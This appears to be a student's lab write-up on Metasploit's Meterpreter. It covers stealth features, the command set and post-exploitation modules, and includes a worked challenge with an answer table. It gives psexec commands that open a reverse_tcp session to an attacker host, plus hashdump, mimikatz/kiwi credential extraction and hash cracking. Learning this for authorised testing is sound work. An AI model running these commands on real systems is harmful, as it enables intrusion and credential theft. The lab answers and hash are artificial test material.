## Metasploit - Meterpreter

### ðŸ”¹ Introduction to Meterpreter

Meterpreter is a Metasploit payload that runs on the target system and acts as an agent within a command and control architecture. It allows interaction with the target OS and files using specialized commands.

#### How does Meterpreter work?

* Runs in memory; no files written to disk (stealthy against antivirus).
* Encrypted communication with attacker machine (avoids detection by IPS/IDS).
* Recognized by antivirus but still provides stealth.

#### Example: Checking Process ID

```bash
meterpreter > getpid
Current pid: 1304
meterpreter > ps
```

* PID helps identify processes on Windows or Linux.
* Meterpreter may run under a legitimate system process like spoolsv.exe.

#### Checking DLLs for Meterpreter

```bash
C:\Windows\system32>tasklist /m /fi "pid eq 1304"
```

* Shows loaded modules for the process.
* No direct meterpreter DLL is visible (stealthy).

---

### ðŸ”¹ Meterpreter Flavors

* Payloads: Inline (single-step) or staged (multi-step).
* Platforms: Android, iOS, Java, Linux, OSX, PHP, Python, Windows.
* Choosing a version depends on OS, available components, and network type.

#### Listing Meterpreter payloads

```bash
msfvenom --list payloads | grep meterpreter
```

* Shows all Meterpreter versions and transport options.

#### Default Payload Example

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```

* `show payloads` lists other compatible payloads for the exploit.

---

### ðŸ”¹ Meterpreter Commands

#### Core Commands

* `background` / `bg`: Backgrounds session.
* `exit`: Terminates session.
* `getuid`: Shows current user.
* `migrate <PID>`: Move Meterpreter to another process.
* `hashdump`: Dumps SAM database hashes.

#### File System Commands

* `cd`, `ls`, `pwd`, `edit`, `cat`, `rm`, `search`, `upload`, `download`.

#### Networking Commands

* `arp`, `ifconfig`, `netstat`, `portfwd`, `route`.

#### System Commands

* `clearev`, `execute`, `getpid`, `kill`, `pkill`, `ps`, `reboot`, `shell`, `shutdown`, `sysinfo`.

#### User/Hardware Commands

* `idletime`, `keyscan_*`, `screenshot`, `record_mic`, `webcam_*`, `getsystem`.

#### Notes

* Some commands depend on target system capabilities.
* Use `help` to see all available commands.

---

### ðŸ”¹ Post-Exploitation with Meterpreter

#### Goals

* Gather system information, user credentials, files.
* Privilege escalation.
* Lateral movement.

#### Additional Modules

* `load kiwi`: Load mimikatz for credential extraction.
* `load python`: Execute Python code on target.

#### Kiwi Commands

* `creds_all`, `creds_msv`, `dcsync`, `golden_ticket_create`, `lsa_dump_sam`, `password_change`, `wifi_list`.

---

### ðŸ”¹ Post Exploitation Challenge (Practical Steps & Explanations)

#### Initial SMB Compromise

```bash
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser ballen
set SMBPass Password1
set payload windows/meterpreter/reverse_tcp
set LHOST <YOUR_KALI_IP>
run
```

* Successfully gains Meterpreter session.
* Up arrow allows command reuse; no need to retype.

#### Managing Multiple Sessions

```bash
sessions -l
sessions -i <ID>
```

* Check active sessions.
* Keep master session stable for exploration; donâ€™t migrate blindly.

#### File Search & Retrieval

```bash
meterpreter > search -f secrets.txt
Found: c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

* Use `search -d <dir>` for faster searches.
* `cat` works in Meterpreter; in Windows shell use `type <file>`.

#### Credential Dumping

```bash
meterpreter > hashdump
```

* Lists SAM database hashes.
* Cracked using online NTLM databases (CrackStation) for cleartext.
* Avoid migrating into low-privilege process after dumping hashes.

#### Notes on Migration

```bash
meterpreter > migrate <PID>
```

* Use to stabilize session or access another process.
* Losing privileges is possible if migrating from SYSTEM to lower user.

#### Practical Answers from Lab

| Question                     | Answer & Steps                                                            |
| ---------------------------- | ------------------------------------------------------------------------- |
| Computer Name                | ACME-TEST (from `sysinfo`)                                                |
| Target Domain                | FLASH (from `sysinfo`)                                                    |
| Share Name                   | speedster (from `net share`)                                              |
| NTLM Hash jchambers          | 69596c7aa1e8daee17f8e78870e25a5c (`hashdump`)                             |
| Cleartext Password jchambers | Cracked via CrackStation                                                  |
| secrets.txt Full Path        | c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt (`search`) |
| Twitter Password             | Content of secrets.txt (`cat`)                                            |
| realsecret.txt Full Path     | Located using `search` in likely directories                              |
| Real Secret                  | The Flash is the fastest man alive (from realsecret.txt)                  |

**Lessons Learned:**

* Meterpreter is stealthy but powerful; proper session management is crucial.
* Use directory-limited searches for speed.
* Kiwi enhances credential access.
* Always keep a stable master session for post-exploitation activities.

